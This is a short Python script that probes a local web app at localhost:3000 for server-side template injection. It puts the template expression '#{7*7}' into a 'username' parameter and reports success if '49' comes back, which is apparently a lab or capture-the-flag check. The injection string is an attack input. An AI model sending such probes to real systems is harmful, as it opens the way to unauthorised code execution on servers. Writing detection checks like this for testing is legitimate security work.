#!/usr/bin/env python3

import requests


URL = "http://localhost:3000"

PAYLOAD = "#{ 7*7 }"

print(requests.get(URL, params={"username": "test"}).text)
r = requests.get(URL, params={"username": "#{7*7}" * 2 + "a" * 5})
print(r.text)

if "49" in r.text:
    print("SSTI with UAF: success")
